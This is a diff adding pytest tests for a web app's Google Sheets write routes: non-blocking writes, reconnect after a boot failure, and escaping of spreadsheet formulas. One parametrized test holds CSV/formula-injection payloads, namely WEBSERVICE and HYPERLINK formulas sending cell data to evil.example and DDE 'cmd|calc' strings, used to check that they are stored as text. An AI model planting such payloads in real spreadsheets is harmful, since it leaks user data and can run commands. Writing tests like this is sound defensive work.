@@ -1,5 +1,8 @@
+import asyncio
 import json
 import re
+import threading
+import time
 import pytest
 from unittest.mock import MagicMock, patch
 from pathlib import Path
@@ -9,6 +12,7 @@ from app.main import app, MAX_BODY_BYTES
 from app.routers.bills import _is_safe_url
 from app.routers.feedback import FeedbackSubmission
 from app.routers.notify import NotifySignup
+from app.services.sheets import SheetsService
 from app.services.senate_votes import parse_senate_vote_xml
 
 FIXTURES = Path(__file__).parent / "fixtures" / "synced"
@@ -367,6 +371,106 @@ def test_site_js_posts_json_with_declared_fields_only(js, path, model):
     assert "headers: { 'Content-Type': 'application/json' }" in call["opts"]
     sent = {part.split(":")[0].strip() for part in call["body"].split(",") if part.strip()}
     assert sent and sent <= set(model.model_fields)
+
+
+# --- Write routes: Google Sheets off the event loop, retried, formula-safe (F005, F031, F046, F085) ---
+
+def _router(path):
+    return "app.routers." + path.removeprefix("/api/")
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("path,payload", WRITES)
+@pytest.mark.parametrize("slow", ["sheets", "fallback-file"])
+async def test_a_slow_write_does_not_stall_other_requests(stored, path, payload, slow):
+    """A 0.5 s Sheets call or file write runs in the threadpool: a GET sent meanwhile is answered at once."""
+    started, finished = threading.Event(), threading.Event()
+
+    def slow_write(_):
+        started.set()
+        time.sleep(0.5)
+        finished.set()
+        return True
+
+    if slow == "sheets":
+        sheets = MagicMock()
+        sheets.is_available = True
+        sheets.append_row.side_effect = slow_write
+        writer = patch(f"{_router(path)}._sheets", sheets)
+    else:  # Sheets is off (the stored fixture), so the row goes to the file
+        writer = patch(f"{_router(path)}._save_to_file", slow_write)
+    with writer:
+        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
+            post = asyncio.create_task(client.post(path, json=payload))
+            for _ in range(300):
+                if started.is_set():
+                    break
+                await asyncio.sleep(0.01)
+            assert started.is_set()
+            sent = time.perf_counter()
+            resp = await client.get("/robots.txt")
+            waited = time.perf_counter() - sent
+            answered_mid_write = not finished.is_set()
+            assert (await post).status_code == 200
+    assert resp.status_code == 200
+    assert answered_mid_write, "the GET waited for the write: it ran on the event loop"
+    assert waited < 0.2
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("path,payload,cells", [
+    ("/api/feedback",
+     {"message": "=1+1", "page_url": '=WEBSERVICE("http://evil.example/?"&B2)', "page_type": "@x",
+      "context_id": "+1", "context_label": " -1"},
+     ["'=1+1", '\'=WEBSERVICE("http://evil.example/?"&B2)', "'@x", "'+1", "' -1"]),
+    ("/api/notify", {"email": '=HYPERLINK("http://evil.example/?"&B3&"@a.co","Click")', "state": "OH"},
+     ['\'=HYPERLINK("http://evil.example/?"&B3&"@a.co","Click")', "OH"]),
+    ("/api/notify", {"email": "+cmd|calc!A0@x.co", "state": "OH"}, ["'+cmd|calc!A0@x.co", "OH"]),
+    ("/api/notify", {"email": "-2+3+cmd|calc!A0@x.co", "state": "OH"}, ["'-2+3+cmd|calc!A0@x.co", "OH"]),
+])
+async def test_formula_payloads_reach_the_sheet_as_text(stored, path, payload, cells):
+    """Through the real SheetsService: every formula cell gets an apostrophe and RAW is passed."""
+    sheets = SheetsService("", "")
+    sheets._worksheet = MagicMock()
+    with patch(f"{_router(path)}._sheets", sheets):
+        resp = await _post(path, json=payload)
+    assert resp.status_code == 200
+    (row,), options = sheets._worksheet.append_row.call_args
+    assert options == {"value_input_option": "RAW"}
+    assert row[0][:2] == "20" and row[1:] == cells  # the timestamp is untouched
+    assert stored(path) == []
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("path,payload", WRITES)
+async def test_sheets_failed_at_boot_is_retried_by_the_route(stored, path, payload):
+    """A Google blip at boot: writes fall back for a minute, then the route itself reconnects (F031)."""
+    worksheet = MagicMock()
+    worksheet.row_values.return_value = ["Timestamp"]
+    gspread = MagicMock()
+    gspread.WorksheetNotFound = type("WorksheetNotFound", (Exception,), {})
+    client = gspread.service_account_from_dict.return_value
+    client.open_by_key.return_value.sheet1 = worksheet
+    client.open_by_key.return_value.worksheet.return_value = worksheet
+    client.open_by_key.side_effect = [Exception("503"), client.open_by_key.return_value]
+    clock = MagicMock()
+    clock.monotonic.return_value = 1000.0
+
+    with patch.dict("sys.modules", {"gspread": gspread}), \
+         patch("app.services.sheets.time", clock):
+        sheets = SheetsService('{"type":"service_account"}', "sheet-123", worksheet_title=(
+            "Notify Signups" if path == "/api/notify" else None))
+        with patch(f"{_router(path)}._sheets", sheets):
+            clock.monotonic.return_value = 1030.0
+            assert (await _post(path, json=payload)).status_code == 200
+            assert len(stored(path)) == 1 and client.open_by_key.call_count == 1
+
+            clock.monotonic.return_value = 1060.0
+            assert (await _post(path, json=payload)).status_code == 200
+
+    assert client.open_by_key.call_count == 2
+    worksheet.append_row.assert_called_once()
+    assert len(stored(path)) == 1  # the second write reached Sheets, not the file
 
 
 # --- XML Safety ---
